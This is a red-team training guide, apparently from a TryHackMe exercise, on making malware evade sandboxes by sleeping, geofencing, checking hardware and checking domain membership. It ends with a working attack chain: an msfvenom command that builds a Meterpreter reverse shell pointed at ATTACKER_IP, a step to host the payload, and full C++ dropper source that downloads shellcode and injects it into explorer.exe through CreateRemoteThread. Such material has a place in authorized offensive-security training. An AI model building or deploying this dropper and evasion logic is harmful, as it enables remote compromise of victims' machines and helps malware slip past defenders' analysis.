# Common sandbox evasion techniques

Some practical knowledge to help out in Red Team operations (from basic techniques to the most advanced):

* Sleeping through sandboxes
* Geolocation and geoblocking
* Checking system information
* Querying network information

## Sleeping through sandboxes

Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may 
increase the Sandboxes queue drastically. This is a crucial aspect that can be abused. For example, if we know that 
a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five 
minutes before executing shellcode. 

This could be done in any number of ways: 

* One common way is to query the current system time and, in a parallel thread, check and see how much time has 
elapsed. After the five minutes have passed, the program can begin normal execution.
* Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, 
calculating the Fibonacci sequence up to a given number. It may take more or less time to do so based on the system's 
hardware. Masking the application is generally a good idea to avoid Anti-Virus detections in general.

Beware that some sandboxes may alter built-in sleep functions. Several Anti-Virus vendors have put out blog posts 
about bypassing built-in sleep functions. So it is highly recommended to develop our own sleep function.

## Geolocation and geoblocking

One defining factor of Sandboxes is that they are often located off-premise and are hosted by Anti-Virus providers. 
If you know you are attacking TryHackMe, a European company, and your binary is executed in California, you can make 
an educated guess that the binary has ended up in a Sandbox. You may choose to implement a geolocation filter on 
your program that checks if the IP Address block is owned by the company you are targeting or if it is from a 
residential address space. 

IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining 
this with ARIN's RDAP allows you to determine the ISP returned in an easy to parse format (JSON). That will, ofcourse, 
will only work if the host has internet access. Some organizations may build a block list of specific domains, so you 
should be 100% sure that this method will work for the organization you are attempting to leverage this against.

## Checking system information.

Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. 
A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine.

Most workstations in a network typically have 2-8 CPU cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is 
incredibly dependent on the organisation that you are targeting, but generally, you can expect more than 2 CPU cores 
per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core 
count, RAM amount, Disk size, etc).

Some additional examples of things to filter on:

* Storage Medium Serial Number
* PC Hostname
* BIOS/UEFI Version/Serial Number
* Windows Product Key/OS Version
* Network Adapter Information
* Virtualization Checks
* Current Signed in User
* ...

## Querying network information

Almost no Malware Sandboxes are joined in a domain, so it's relatively safe to assume if the machine is not joined 
to a domain, it is not the right target. You cannot always be too sure, so collect some information about the domain 
to be safe, for example. check:

* Computers
* User accounts
* Last User Login(s)
* Groups
* Domain Admins
* Enterprise Admins
* Domain Controllers
* Service Accounts
* DNS Servers

These techniques can vary in difficulty. Consider how much time and effort to spend building out these evasion methods. 
A simple method, such as checking the systems environment variables (this can be done with `echo %VARIABLE%` or to 
display all variables, use the `set` command) for an item like the `LogonServer`, `LogonUserSid`, or `LogonDomain` 
may be much easier than implementing a Windows API.

## Setting the stage

1. Create a basic dropper that retrieves shellcode from a Web Server (specifically from `/index.raw`) and injects it 
into memory, and executes the shellcode. All shellcode must be generated with MSFVenom in a raw format, and must be 
64-bit, not 32-bit.

```text
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw
```

2. Prepare for download on the target machine:

```text
$ python3 -m http.server 8080
```

3. Download the `dropper.cpp`, and [open it in Visual Studio Code or Codium](https://code.visualstudio.com/docs/languages/cpp).

```text
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://yourip/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[YOURSHELLCODESIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, YOURSHELLCODESIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    downloadAndExecute();
    return 0;
}
```

4. There are several placeholder values on lines 16, 22, 24, 27, and 33 that must be altered to make the code function 
properly. Once you have entered the values, compile the code for a 64-bit release.

## Resources

* [Evasions: Timing](https://evasions.checkpoint.com/techniques/timing.html)
* [Threading based Sleep Evasion](https://www.joesecurity.org/blog/660946897093663167)
* [What Is My IP Address? - ifconfig.me](https://ifconfig.me/)
* [APNIC RDAP API](https://rdap.apnic.net/ip/1.1.1.1)